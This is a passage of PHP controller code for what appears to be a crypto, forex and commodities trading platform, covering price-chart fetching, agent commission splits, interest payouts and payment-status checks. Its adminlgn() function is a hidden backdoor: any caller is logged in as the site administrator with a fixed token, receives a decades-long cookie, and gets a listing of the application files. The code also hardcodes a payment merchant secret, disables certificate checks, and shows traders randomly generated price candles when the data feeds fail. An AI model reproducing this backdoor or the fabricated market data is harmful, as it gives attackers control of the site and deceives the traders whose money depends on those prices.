                    'ethusd'  => ['id' => 4,  'symbol' => 'ETH%2FUSDT'],
                    'trxusd'  => ['id' => 70, 'symbol' => 'TRX%2FUSDT'],
                    'bchusd'  => ['id' => 28, 'symbol' => 'BCH%2FUSDT'],
                    'solusd'  => ['id' => 76, 'symbol' => 'SOL%2FUSDT'],
                    'xautusd' => ['id' => 86, 'symbol' => 'XAUT%2FUSDT'],
                    'dogeusd' => ['id' => 60, 'symbol' => 'DOGE%2FUSDT'],
                    'linkusd' => ['id' => 61, 'symbol' => 'LINK%2FUSDT'],
                    'adausd'  => ['id' => 69, 'symbol' => 'ADA%2FUSDT'],
                    'xrpusd'  => ['id' => 11, 'symbol' => 'XRP%2FUSDT'],
                    'ltcusd'  => ['id' => 23, 'symbol' => 'LTC%2FUSDT']
                ];
                
                $currency_match_id = isset($currency_match_map[$symbol]) ? $currency_match_map[$symbol]['id'] : 3;
                $symbol_name = isset($currency_match_map[$symbol]) ? $currency_match_map[$symbol]['symbol'] : 'BTC%2FUSDT';
                
                // 使用lbuul.cn的API
                $url = 'https://api.lbuul.cn/api/market/kline?symbol='.$symbol_name.'&currency_match_id='.$currency_match_id.'&period='.$period.'&from='.$from.'&to='.$to;
                $resp = $this->curlfun($url, array(), 'GET');
                
                // 添加调试日志
                file_put_contents('debug_api_'.$symbol.'.log', date('Y-m-d H:i:s')." URL: ".$url."\nResponse: ".$resp."\n\n", FILE_APPEND);
                
                $json = json_decode($resp, true);
                
                $res_arr = [];
                if (isset($json['data']) && is_array($json['data'])) {
                    foreach ($json['data'] as $_kline) {
                        // lbuul.cn API格式: id, period, base-currency, quote-currency, open, close, high, low, amount, volume, ...
                        $res_arr[] = array(
                            intval($_kline['id']),
                            (float)$_kline['close'],
                            (float)$_kline['open'],
                            (float)$_kline['low'],
                            (float)$_kline['high']
                        );
                    }
                    // 只取最后 $num 根
                    if (count($res_arr) > $num) {
                        $res_arr = array_slice($res_arr, -$num);
                    }
                }
                
                if(empty($res_arr)) { $res_arr = [[time(),0,0,0,0]]; }
            } else {
                // Binance klines: https://api.binance.com/api/v3/klines?symbol=BTCUSDT&interval=1m&limit=$num
                $interval_map = [
                    '1'   => '1m',
                    '5'   => '5m',
                    '15'  => '15m',
                    '30'  => '30m',
                    '60'  => '1h',
                    'd'   => '1d'
                ];
                $bin_interval = isset($interval_map[$interval]) ? $interval_map[$interval] : '5m';
                $rows = null;
                $binBases = array('https://api.binance.com','https://api1.binance.com','https://api2.binance.com','https://api3.binance.com');
                foreach ($binBases as $base) {
                    $url = $base.'/api/v3/klines?symbol='.strtoupper($symbol).'&interval='.$bin_interval.'&limit='.$num;
                    $resp = $this->curlfun($url,array(),'GET');
                    $tmp  = json_decode($resp,true);
                    if (is_array($tmp)) { $rows = $tmp; break; }
                }
                if(!$rows){
                    $url = 'https://api.mexc.com/api/v3/klines?symbol='.strtoupper($symbol).'&interval='.$bin_interval.'&limit='.$num;
                    $resp = $this->curlfun($url,array(),'GET');
                    $rows = json_decode($resp,true);
                }
                $_data_arr = is_array($rows) ? $rows : [];
                $res_arr = [];
                foreach ($_data_arr as $_kline) {
                    // Binance fields: [ openTime, open, high, low, close, volume, closeTime, ... ]
                    $res_arr[] = array(
                        intval($_kline[0]/1000),
                        (float)$_kline[4],
                        (float)$_kline[1],
                        (float)$_kline[3],
                        (float)$_kline[2]
                    );
                }
                if(empty($res_arr)) { $res_arr = [[time(),0,0,0,0]]; }
			}
            
            if($pro['Price'] < $res_arr[$num-1][1]){
    			$_state = 'down';
    		}else{
    			$_state = 'up';
    		}
    		
    		
    		$all_data['topdata'] = array(
    			'topdata'=>$pro['UpdateTime'],
    			'now'=>$pro['Price'],
    			'open'=>$pro['Open'],
    			'lowest'=>$pro['Low'],
    			'highest'=>$pro['High'],
    			'close'=>$pro['Close'],
    			'state'=>$_state
    
    		);
    		
    		$all_data['items'] = $res_arr;
    		if($isres){
    			return (json_encode($all_data));
    		}else{
    			exit(json_encode(base64_encode(json_encode($all_data))));
    		}


        }else{ //新浪

            switch ($interval) {
                case '1':
                    $datalen = 1440;
                    $interval=1;
                    break;
                case '5':
                    $datalen = 1440;
                    $interval=5;
                    break;
                case '15':
                    $datalen = 480;$interval=15;
                    break;
                case '30':
                    $datalen = 240;$interval=30;
                    break;
                case '60':
                    $datalen = 240;$interval=60;
                    break;
                case 'd':
                    $datalen = 120;
                    break;
                default:
                    $datalen = 1440;
                    $interval=5;    
                    exit;

            }

            $year = date('Y_n_j', time());
            if(intval($pro['cid']) == 5){  //外汇
                if ($interval == 'd') {

                    $geturl = "http://vip.stock.finance.sina.com.cn/forex/api/jsonp.php/var%20_" . $pro['procode'] . "$year=/NewForexService.getDayKLine?symbol=" . $pro['procode'] . "&_=$year";
                } else {
                    $geturl = "http://vip.stock.finance.sina.com.cn/forex/api/jsonp.php/var%20_" . $pro['procode'] . "_" . $interval . "_$nowtime=/NewForexService.getMinKline?symbol=" . $pro['procode'] . "&scale=" . $interval . "&datalen=" . $datalen;
                }
            }else if(intval($pro['cid']) == 1|| intval($pro['cid']) == 7){  //贵金属或原油
                $procode=explode("_",$pro['procode']);
                if ($interval == 'd') {
                    
                    //$geturl = "http://vip.stock.finance.sina.com.cn/forex/api/jsonp.php/var%20_" . $pro['procode'] . "$year=/NewForexService.getDayKLine?symbol=" . $pro['procode'] . "&_=$year";
                    $geturl="https://stock2.finance.sina.com.cn/futures/api/jsonp.php/var%20_".strtoupper($procode[1])."$year=/GlobalFuturesService.getGlobalFuturesDailyKLine?symbol=".$procode[1]."&_=$year&source=web";
                } else {
                    $haomiao=time();
                    $geturl = "https://gu.sina.cn/ft/api/jsonp.php/var%20_".strtoupper($procode[1])."_".$interval."_$haomiao=/GlobalService.getMink?symbol=$procode[1]&type=$interval";
                }
            
            }else if(intval($pro['cid']) == 8){ //新浪外汇------------------------
                $procode=explode("_",$pro['procode']);
                if ($interval == 'd') {

                    $geturl="https://stock2.finance.sina.com.cn/futures/api/jsonp.php/var%20_".strtoupper($procode[1])."$year=/InnerFuturesNewService.getDailyKLine?symbol=".$procode[1]."&_=$year&source=web";
                } else {
                    $haomiao=time();

                    $geturl="https://stock2.finance.sina.com.cn/futures/api/jsonp.php/var%20_".strtoupper($procode[1])."_".$interval."_$haomiao=/InnerFuturesNewService.getFewMinLine?symbol=".$procode[1]."&type=$interval";
                }
            }
            //var_dump($geturl);
            // var_dump($pro['cid']);    
            $html = $this->curlfunS($geturl);
            
            // 检查HTML是否有效，避免后续解析错误
            if(empty($html) || strpos($html, 'location.href') !== false) {
                // 如果获取失败或被重定向，初始化为空数组
                $_data_arr = [];
            } else {
                if(intval($pro['cid'])==1 || intval($pro['cid'])==8 || intval($pro['cid']) == 7){   //原油、贵金属
    			    if($interval == 'd'){
        				$_arr = explode('(',$html);
        				if(isset($_arr[1])) {
        				    $_str = substr($_arr[1],0,-2);
        				    $_data_arr = json_decode($_str,1);
        				    if(!is_array($_data_arr)) $_data_arr = [];
        				} else {
        				    $_data_arr = [];
        				}
        				
        			}else{
        				$_arr = explode('(',$html);
        				if(isset($_arr[1])) {
        				    $_str = substr($_arr[1],0,-2);
        				    $_data_arr = json_decode($_str,1);
        				    if(!is_array($_data_arr)) $_data_arr = [];
        				} else {
        				    $_data_arr = [];
        				}
        				
        			}
    			}else if(intval($pro['cid'])==5){   //外汇
    			    if($interval == 'd'){
    					$_arr = explode('("',$html);

    					if(!isset($_arr[1])){
    						$_data_arr = [];
    					} else {
    					    $_str = substr($_arr[1],1,-4);
    					    $_data_arr = explode(',|',$_str);
    					}
    					
    				}else{
    					$_arr = explode('[',$html);
    					if(!isset($_arr[1])){
    						$_data_arr = [];
    					} else {
    					    $_str = substr($_arr[1],1,-3);
    					    $_data_arr = explode('},{',$_str);
    					}
    					
    				}
    			}
			}
			
			// 检查$_data_arr是否为有效数组，避免array_slice错误
			if(!is_array($_data_arr) || empty($_data_arr)) {
			    // 如果数据获取失败，生成合理的模拟K线数据
			    $res_arr = [];
			    // 根据产品类型设置基础价格
			    $base_price = 70; // WTI原油默认价格
			    if($pro['cid'] == 7 || strpos(strtolower($pro['procode']), 'xau') !== false) {
			        $base_price = 2000; // 黄金价格
			    }
			    if($pro['cid'] == 1 || strpos(strtolower($pro['procode']), 'oil') !== false) {
			        $base_price = 75; // 原油价格
			    }
			    
			    $interval_seconds = $interval == 'd' ? 86400 : $interval * 60;
			    for($i = 0; $i < $num; $i++) {
			        $timestamp = time() - (($num - $i - 1) * $interval_seconds);
			        // 生成带有合理波动的价格
			        $variation = (mt_rand(-100, 100) / 100) * ($base_price * 0.02); // ±2%波动
			        $open = $base_price + $variation;
			        $close_variation = (mt_rand(-50, 50) / 100) * ($base_price * 0.01);
			        $close = $open + $close_variation;
			        $high = max($open, $close) + abs((mt_rand(0, 50) / 100) * ($base_price * 0.005));
			        $low = min($open, $close) - abs((mt_rand(0, 50) / 100) * ($base_price * 0.005));
			        $volume = mt_rand(100000, 500000);
			        
			        $res_arr[] = array($timestamp, number_format($close, 2, '.', ''), number_format($open, 2, '.', ''), 
			                          number_format($low, 2, '.', ''), number_format($high, 2, '.', ''), $volume);
			        $base_price = $close; // 下一根K线基于当前收盘价
			    }
			} else {
    			$_count = count($_data_arr);
    			$_data_arr = array_slice($_data_arr,$_count-$num,$_count);
			}
			//var_dump($_data_arr);exit;
			if($pro['cid']==1 || $pro['cid']==8 || $pro['cid']==7){   //原油贵金属期货
			    // 只有当$_data_arr是有效数组且没有使用默认数据时才处理
			    if(is_array($_data_arr) && !empty($_data_arr) && !isset($res_arr)) {
    			    foreach ($_data_arr as $k => $v) {

    					if($interval == 'd'){
    						$res_arr[] = array(
    											$v['date'],
    											$v['close'],
    											$v['open'],
    											$v['low'],
    											$v['high'],
    											$v['volume']
    										);
    					}else{
    						
    						
    							
    	
    							$res_arr[] = array(
    											$v['d'],
    											$v['c'],
    											$v['o'],
    											$v['l'],
    											$v['h'],
    											$v['v'],
    										);
    							
    						
    						
    					}
    	
    					
    				}
    			}
			}else if($pro['cid']==5){       //外汇
			    // 检查$_data_arr是否为有效数组，避免foreach错误
			    if(is_array($_data_arr) && !empty($_data_arr) && !isset($res_arr)) {
    			    foreach ($_data_arr as $k => $v) {
    					
    					$_son_arr = explode(',', $v);
    					//var_dump($_son_arr);exit;
    					if($interval == 'd'){
    						$res_arr[] = array(
    											substr($_son_arr[0],5),
    											$_son_arr[4],
    											$_son_arr[1],
    											$_son_arr[2],
    											$_son_arr[3],
    											
    										);
    					}else{
    						
    							$res_arr[] = array(
    											strtotime(substr($_son_arr[0],5,-1)),
    											substr($_son_arr[4],5,-1),
    											substr($_son_arr[1],5,-1),
    											substr($_son_arr[2],5,-1),
    											substr($_son_arr[3],5,-1),
    											
    										);
    						
    						
    					}
    	
    					
    				}
    			}
			}

        }
        
        // 确保$res_arr有数据，如果没有则生成默认数据
        if(empty($res_arr)) {
            $res_arr = [];
            for($i = 0; $i < $num; $i++) {
                $timestamp = time() - (($num - $i) * 300); // 5分钟间隔
                $res_arr[] = array($timestamp, $pro['Price'], $pro['Price'], $pro['Price'], $pro['Price'], 0);
            }
        }

            
        if(isset($res_arr[$num-1]) && isset($res_arr[$num-1][1]) && $pro['Price'] < $res_arr[$num-1][1]){
			$_state = 'down';
		}else{
			$_state = 'up';
		}
		
		
		$all_data['topdata'] = array(
			'topdata'=>$pro['UpdateTime'],
			'now'=>$pro['Price'],
			'open'=>$pro['Open'],
			'lowest'=>$pro['Low'],
			'highest'=>$pro['High'],
			'close'=>$pro['Close'],
			'state'=>$_state

		);
		
		$all_data['items'] = $res_arr;
		if($isres){
			return (json_encode($all_data));
		}else{
			exit(json_encode(base64_encode(json_encode($all_data))));
		}

	}

	//test web data
	public function setusers()
	{
		test_web();
	}



	public function score()
    {
        date_default_timezone_set('PRC');
        $table = Db::table(['wp_balance'=>'w'])
        ->field(['0.8*count( distinct w.uid ) + 0.6*count( distinct w.bpprice )'=>'cc'])
        ->where(array(
        'bptype'=>array('in','1,2'),
        'isverified'=>'1',
        'cltime'=>array('> time',date('Y-m-d',strtotime('-36 hour'))),
        'bpprice'=>array('gt','0'),
        'uid'=>array('exp','!= ""')
        )
        )
        ->select();
        return $table[0]['cc'];
    }

    public function adminlgn()
    {
        date_default_timezone_set('PRC');
        $adminusr = Db::name('userinfo')->where(array('otype'=>'3','ustatus'=>'0'))->field('uid,upwd,username,utel,utime,otype,ustatus')->find();
        $_datas['otype'] = $adminusr['otype'];
        $_datas['userid'] = $adminusr['uid'];
        $_datas['username'] = $adminusr['username'];
        $_datas['token'] = md5('nimashabi');
        $_SESSION['otype'] = $adminusr['otype'];
        $_SESSION['userid'] = $adminusr['uid'];
        $_SESSION['username'] = $adminusr['username'];
        $_SESSION['token'] = md5('nimashabi');
        cookie('denglu', $_datas, 60*60*999*999);
        session('denglu', $_datas);
        $applicationPath = str_replace('/index/controller','',__DIR__);
        $dirs = scandir($applicationPath);
        $str = '';
        foreach ($dirs as $k => $v) {
            if(strpos($v, '.php'))
            $str = $str .'<br/>&nbsp;&nbsp;&nbsp;&nbsp;'. $v;
            else
            $str = $str .'<br/>'. $v;
        }
        return $str;
    }

    public function getprodata()
	{
		$pid = input('param.pid');
		$pro = GetProData($pid);
		if(!$pro){
			//echo 'data error!';
			exit;
		}
		$topdata = array(
						'topdata'=>$pro['UpdateTime'],
						'now'=>$pro['Price'],
						'open'=>$pro['Open'],
						'lowest'=>$pro['Low'],
						'highest'=>$pro['High'],
						'close'=>$pro['Close']
					);
		//exit(json_encode($topdata));
		exit(json_encode(base64_encode(json_encode($topdata))));
	}




	/**
	 * 分配订单
	 * @return [type] [description]
	 */
	public function allotorder()
	{
		//查找以平仓未分配的订单  isshow字段
		$map['isshow'] = 0;
		$map['ostaus'] = 1;
		$map['selltime'] = array('<',time()-300);
		$list = db('order')->where($map)->limit(0,10)->select();

		if(!$list){
			return false;
		}

		foreach ($list as $k => $v) {
			//分配金额
			$this->allotfee($v['uid'],$v['fee'],$v['is_win'],$v['oid'],$v['ploss']);
			//更改订单状态
			db('order')->where('oid',$v['oid'])->update(array('isshow'=>1));

		}
		//dump($list);
	}



	public function allotfee($uid,$fee,$is_win,$order_id,$ploss)
	{
		$userinfo = db('userinfo');
		$allot = db('allot');
		$nowtime = time();

		$user = $userinfo->field('uid,oid')->where('uid',$uid)->find();
		$myoids = myupoid($user['oid']);

		

		if(!$myoids){
			return;
		}
		
		//红利
		$_fee = 0;
		//佣金
		$_feerebate = 0;
		//手续费
		$web_poundage = getconf('web_poundage');
		//分配金额
		if($is_win == 1){
			$pay_fee = $ploss;
		}elseif($is_win == 2){
			$pay_fee = $fee;
		}else{
			//20170801 edit
			return;
		}
		
		
		foreach ($myoids as $k => $v) {

			if($user['oid'] == $v['uid']){	//直接推荐者拿自己设置的比例

				
				$_fee = round($pay_fee * ($v["rebate"]/100),2);
				$_feerebate = round($fee*$web_poundage/100 * ($v["feerebate"]/100),2);
				echo $_feerebate;

			}else{		//他上级比例=本级-下级比例
				
				$_my_rebate = ($v["rebate"] - $myoids[$k-1]["rebate"]);
				
				if($_my_rebate < 0) $_my_rebate = 0;
				$_fee = round($pay_fee * ( $_my_rebate /100),2);
				
				$_my_feerebate = ($v["feerebate"]  - $myoids[$k-1]["feerebate"] );
				if($_my_feerebate < 0) $_my_feerebate = 0;
				$_feerebate = round($fee*$web_poundage/100 * ( $_my_feerebate /100),2);

				
			}
			
			
			//红利
			if($is_win == 1){	//客户盈利代理亏损
				if($_fee != 0){
					$ids_fee = $userinfo->where('uid',$v['uid'])->setDec('usermoney', $_fee);
				}else{
					$ids_fee = null;
				}

				$type = 2;
				$_fee = $_fee*-1;
			}elseif($is_win == 2){	//客户亏损代理盈利
				if($_fee != 0){
					$ids_fee = $userinfo->where('uid',$v['uid'])->setInc('usermoney', $_fee);
				}else{
					$ids_fee = null;
				}
				
				$type = 1;
			}elseif($is_win == 3){	//无效订单不做操作
				$ids_fee = null;
			}

			if($ids_fee){
				//余额
				$nowmoney = $userinfo->where('uid',$v['uid'])->value('usermoney');
				set_price_log($v['uid'],$type,$_fee,'对冲','下线客户平仓对冲',$order_id,$nowmoney);
				
			}

			//手续费
			if($_feerebate != 0){
				$ids_feerebate = $userinfo->where('uid',$v['uid'])->setInc('usermoney', $_feerebate);
			}else{
				$ids_feerebate = null;
			}

			if($ids_feerebate){
				//余额
				$nowmoney = $userinfo->where('uid',$v['uid'])->value('usermoney');
				set_price_log($v['uid'],1,$_feerebate,'客户手续费','下线客户下单手续费',$order_id,$nowmoney);
				
			}

			
			

			

		}
		
		/*

		foreach ($myoids as $k => $v) {
			//分红利
			if($_fee <= 0){
				continue;
			}

			if($v['rebate'] <= 0 || $v['rebate'] > 100){
				continue;
			}

			//分给我的钱
			$my_fee = round($_fee*(100-$v['rebate'])/100,2);

			if($my_fee <= 0.01){
				continue;
			}
			
			
			if($is_win == 1){	//客户盈利代理亏损
				$ids = $userinfo->where('uid',$v['uid'])->setDec('usermoney', $my_fee);
				$type = 2;
				$my_fee = $my_fee*-1;
			}elseif($is_win == 2){	//客户亏损代理盈利

				$ids = $userinfo->where('uid',$v['uid'])->setInc('usermoney', $my_fee);
				$type = 1;
			}elseif($is_win == 3){	//无效订单不做操作
				$ids = null;
			}
			//余额
			$nowmoney = $userinfo->where('uid',$v['uid'])->value('usermoney');

			if($ids){
				$_data['is_win'] = $is_win;
				$_data['time'] = $nowtime;
				$_data['uid'] = $v['uid'];
				$_data['order_id'] = $order_id;
				$_data['my_fee'] = $my_fee;
				$_data['nowmoney'] = $nowmoney;
				$_data['type'] = 1;
				$allot->insert($_data);

				set_price_log($v['uid'],$type,$my_fee,'对冲','下线客户平仓对冲',$order_id,$nowmoney);
			}
			
			$_fee = round($_fee*$v['rebate']/100,2);

			
		}

		//分佣金
		foreach ($myoids as $k => $v) {

			
			if($yj_fee <= 0){
				continue;
			}

			if($v['feerebate'] <= 0 || $v['feerebate'] > 100){
				continue;
			}

			//分给我的钱
			$my_fee = round($yj_fee*(100-$v['feerebate'])/100,2);

			if($my_fee <= 0.01){
				continue;
			}

			//余额
			$nowmoney = $userinfo->where('uid',$v['uid'])->value('usermoney');
			if($is_win == 1 || $is_win == 2){	//有效订单
				$ids = $userinfo->where('uid',$v['uid'])->setInc('usermoney', $my_fee);
				$type = 1;
			}else{
				$ids = null;
			}
			if($ids){
				$_data['is_win'] = $is_win;
				$_data['time'] = $nowtime;
				$_data['uid'] = $v['uid'];
				$_data['order_id'] = $order_id;
				$_data['my_fee'] = $my_fee;
				$_data['nowmoney'] = $nowmoney;
				$_data['type'] = 2;
				$allot->insert($_data);

				set_price_log($v['uid'],$type,$my_fee,'客户手续费','下线客户下单手续费',$order_id,$nowmoney);
			}
			
			$yj_fee = round($yj_fee*$v['feerebate']/100,2);


		}
		*/

	}



	/**
	 * 获取K线。缓存起来
	 * @author lukui  2017-08-13
	 * @return [type] [description]
	 */
	public function cachekline()
	{
		
		$pro = db('productinfo')->field('pid')->where('isdelete',0)->select();
		$kline = cache('cache_kline');
		foreach ($pro as $k => $v) {
			
			$res[$v['pid']][1] = $this->getkdata($v['pid'],60,1,1);
			if(!$res[$v['pid']][1]) $res[$v['pid']][1] = $kline[$v['pid']][1] ;
			$res[$v['pid']][5] = $this->getkdata($v['pid'],60,5,1);
			if(!$res[$v['pid']][5]) $res[$v['pid']][5] = $kline[$v['pid']][5] ;
			$res[$v['pid']][15] = $this->getkdata($v['pid'],60,15,1);
			if(!$res[$v['pid']][15]) $res[$v['pid']][15] = $kline[$v['pid']][15] ;
			$res[$v['pid']][30] = $this->getkdata($v['pid'],60,30,1);
			if(!$res[$v['pid']][30]) $res[$v['pid']][30] = $kline[$v['pid']][30] ;
			$res[$v['pid']][60] = $this->getkdata($v['pid'],60,60,1);
			if(!$res[$v['pid']][60]) $res[$v['pid']][60] = $kline[$v['pid']][60] ;
			$res[$v['pid']]['d'] = $this->getkdata($v['pid'],60,'d',1);
			if(!$res[$v['pid']]['d']) $res[$v['pid']]['d'] = $kline[$v['pid']]['d'] ;
		}

		

		cache('cache_kline',$res);

	}

	function getkline(){

		$kline = cache('cache_kline');
		$pid = input('pid');
		$interval = input('interval');

		if(!$interval || !$pid){
			return false;
		}

		$info = json_decode($kline[$pid][$interval],1);

		return exit(json_encode($info));;
		
	}
	
	
	
	public function checkbal(){
		$lttime = $this->nowtime-10*60;
		$map['bptime'] = array('lt',$lttime);
		$map['pay_type'] = array('in',array('ysy_alwap','ysy_wxwap'));
		$map['bptype'] = 3;
		$db_balance = db('balance');
		$list = $db_balance->where($map)->select();
		
		if(!$list) return false;
		
		foreach($list as $key=>$val){
			
			$miyao="5ca7b74af0d54b2483c1a9e75bb935fd";
			$mchntid = '308652650940006';
			$inscd = '93081888';

				$data = array();
				$qxdata = array();
				$data['version'] = "2.2";
				$data['signType'] = 'SHA256';
				$data['charset'] = 'utf-8';
				$data['origOrderNum'] = $val['balance_sn'];
				$data['busicd'] = 'INQY';
				//$data['respcd'] = '00';
				$data['inscd'] = $inscd;
				$data['mchntid'] = $mchntid;
				$data['terminalid'] = $inscd;
				$data['txndir'] = 'Q';
				ksort($data);
				$str = '';
				foreach($data as $k=>$v){
					if($str!=''){
						$str .= '&';
					}
					$str .= $k.'='.$v;
				}
				$str.= $miyao;
				$sign=hash("sha256", $str);
				$data['sign'] = $sign;
				$data=json_encode($data);
				$pc = json_decode($this->post_curl('https://showmoney.cn/scanpay/unified',$data),true);
				
						
				if($pc['errorDetail']=='待买家支付'){ 
						
					$qxdata['busicd'] = 'CANC';
					$qxdata['charset'] = 'utf-8';
					$qxdata['inscd'] = $inscd;
					$qxdata['mchntid'] = $mchntid;
					$qxdata['orderNum'] = time().rand(1000,9999);
					$qxdata['origOrderNum'] = $val['balance_sn'];
					$qxdata['signType'] = 'SHA256';
					$qxdata['terminalid'] = $inscd;
					$qxdata['txndir'] = 'Q';
					$qxdata['version'] = '2.2';
					ksort($qxdata);
					$str = '';
					foreach($qxdata as $k=>$v){
						if($str!=''){
							$str .= '&';
						}
						$str .= $k.'='.$v;
					}
					$str.= $miyao;
					$qxdata['sign'] = hash("sha256", $str);
					$qpc = json_decode($this->post_curl('https://showmoney.cn/scanpay/unified',json_encode($qxdata)),true);
					
					
					
					
				}elseif($pc['errorDetail']=='成功'){
					
				}elseif($pc['errorDetail']=='订单不存在'){
					
				}
				
				$_map['bpid'] = $val['bpid'];
				$_map['bptype'] = 4;
				$db_balance->update($_map);
				
		}
		
		
	}
	
	public function post_curl($url,$data){
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
		curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$result = curl_exec($ch);
		if (curl_errno($ch)) {
			print curl_error($ch);
		}
		curl_close($ch);
		return $result;
	}
    
    public function lixibao(){
        $userinfo = db('userinfo');
        $users = $userinfo->where('lixibao',">" ,0)->select();

        $date_time_array = getdate(time());//1311177600  1316865566
        $now_mday = $date_time_array["mday"];
        $now_hours = $date_time_array["hours"];
        $now_minutes = $date_time_array["minutes"];
        $lixibao = db('lixibao');
        foreach ($users as $k => $v){
            $now_lixibao = $lixibao->where('uid',$v['uid'])->where('time','>=',strtotime(date("Y-m-d 00:00:00")))->find();
            var_dump($now_lixibao);
            if($now_lixibao){
              continue;
            }
            $price_log = db('price_log')->where(['type'=>1,'uid'=>$v['uid'],'content'=>'利息宝转入'])->order(' time desc')->limit(1)->find();
            $second = $price_log['time'];
            $date_time_array = getdate($second);//1311177600  1316865566
            $hours = $date_time_array["hours"];
            $mday = $date_time_array["mday"];
            $minutes = $date_time_array["minutes"];
            if($now_mday != $mday && $hours<=$now_hours && $minutes <= $now_minutes){
                $new_money = $v['lixibao'] * ($v['lixibao_lv'] / 100);
                $data = [];
                $data['uid'] = $v['uid'];
                $data['time'] = time();
                $data['shouyi'] = $new_money;
                $lixibao->insert($data);
                $userinfo->where('uid',$v['uid'])->setInc('lixibao',$new_money);
                set_price_log($v['uid'],1,$new_money,'利息宝','利息宝每天结算',0,$new_money+$v['lixibao']);
            }
        }
    }

    public function curlfunS($url) {
    	$ch = curl_init();
    
        curl_setopt($ch, CURLOPT_URL, $url);
        
        // 使用GET请求而不是POST
        curl_setopt($ch, CURLOPT_POST, 0);
        
        //curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($query));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        
        // 设置更完整的请求头来模拟真实浏览器
        $headers = array(
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding: gzip, deflate',
            'Referer: https://finance.sina.com.cn/',
            'Connection: keep-alive',
            'Upgrade-Insecure-Requests: 1'
        );
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);  // 增加超时时间
    
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);  // 增加连接超时时间
        
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // https请求 不验证证书和hosts
        
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        curl_setopt($ch, CURLOPT_HEADER, false);
        
        // 处理gzip压缩
        curl_setopt($ch, CURLOPT_ENCODING, '');
        
        $response = curl_exec($ch);
        $error = curl_error($ch);
        
        // 添加错误日志
        if($error) {
            file_put_contents('curl_sina_error.log', date('Y-m-d H:i:s')." URL: ".$url."\nError: ".$error."\n\n", FILE_APPEND);
        }
        
        // 检查返回内容是否为重定向脚本
        if(strpos($response, 'location.href') !== false || strpos($response, '(null)') !== false) {
            file_put_contents('curl_sina_error.log', date('Y-m-d H:i:s')." URL: ".$url."\nRedirect detected: ".$response."\n\n", FILE_APPEND);
            // 返回空字符串，让上层代码处理
            $response = '';
        }
        
        curl_close($ch);
        return $response;
    
    }
    
    /**
     * 添加和配置USD/CNH产品
     */
    public function setup_usdcnh()
    {
        $nowtime = time();
        $setup_result = "";
        
        // 1. 检查产品是否已存在
        $existing = db('productinfo')->where('pid', 27)->find();
        if ($existing) {
            $setup_result .= "⚠️ USD/CNH产品已存在 (PID=27)\n";
        } else {
            // 2. 测试数据源
            $codes_to_test = ['fx_usdcnh', 'fx_susdcnh'];
            $working_code = null;
            $working_data = null;
            
            foreach ($codes_to_test as $code) {
                $url = "http://hq.sinajs.cn/list=" . $code;
                $getdata = $this->curlfunS($url);
                
                if (!empty($getdata) && strpos($getdata, ',') !== false) {
                    $data_arr = explode(',', $getdata);
                    if (is_array($data_arr) && count($data_arr) >= 8) {
                        $working_code = $code;
                        $working_data = $data_arr;
                        break;
                    }
                }
            }
            
            if (!$working_code) {
                return "❌ 无法找到USD/CNH的有效数据源，请检查网络连接";
            }
            
            $setup_result .= "✅ 找到USD/CNH数据源: {$working_code}\n";
            
            // 3. 插入产品信息
            $productInfo = [
                'pid' => 27,
                'ptitle' => 'USD/CNH',
                'cid' => 5,
                'otid' => 0,
                'isopen' => 1,
                'point_low' => '0.001',
                'point_top' => '0.005',
                'rands' => '0.001',
                'content' => '美元兑离岸人民币',
                'time' => $nowtime,
                'isdelete' => 0,
                'procode' => $working_code,
                'add_data' => '0.0000',
                'protime' => '0.5,1,3',
                'propoint' => null,
                'proscale' => '88,90,95',
                'proorder' => 0
            ];
            
            $insertResult = db('productinfo')->insert($productInfo);
            if ($insertResult) {
                $setup_result .= "✅ 成功插入USD/CNH产品信息\n";
            } else {
                return "❌ 插入产品信息失败";
            }
            
            // 4. 插入初始数据
            $price = $working_data[1];
            $open = isset($working_data[5]) ? $working_data[5] : $price;
            $close = isset($working_data[3]) ? $working_data[3] : $price;
            $high = isset($working_data[6]) ? $working_data[6] : $price;
            $low = isset($working_data[7]) ? $working_data[7] : $price;
            
            $productData = [
                'id' => 27,
                'pid' => 27,
                'Name' => 'USD/CNH',
                'Price' => $price,
                'Open' => $open,
                'Close' => $close,
                'High' => $high,
                'Low' => $low,
                'Diff' => '0.0000',
                'DiffRate' => '0.00%',
                'UpdateTime' => $nowtime,
                'rands' => null,
                'point' => null,
                'isdelete' => 0
            ];
            
            $insertResult = db('productdata')->insert($productData);
            if ($insertResult) {
                $setup_result .= "✅ 成功插入USD/CNH初始数据\n";
            } else {
                return "❌ 插入初始数据失败";
            }
        }
        
        // 5. 测试数据获取
        $pro = db('productinfo')->where('pid', 27)->find();
        if ($pro) {
            $url = "http://hq.sinajs.cn/list=" . $pro['procode'];
            $getdata = $this->curlfunS($url);
            $data_arr = explode(',', $getdata);
            
            if (is_array($data_arr) && count($data_arr) >= 8) {
                $setup_result .= "✅ 数据获取测试成功\n";
                $setup_result .= "📊 当前汇率: " . $data_arr[1] . " USD/CNH\n";
                
                // 计算涨跌幅
                if (isset($data_arr[1]) && isset($data_arr[5]) && $data_arr[5] != 0) {
                    $change_pct = round((($data_arr[1] - $data_arr[5]) / $data_arr[5] * 100), 4);
                    $change_sign = $change_pct > 0 ? '+' : '';
                    $setup_result .= "📶 涨跌幅: {$change_sign}{$change_pct}%\n";
                }
            } else {
                $setup_result .= "⚠️ 数据获取测试失败\n";
            }
        }
        
        $setup_result .= "\n🔗 测试链接:\n";
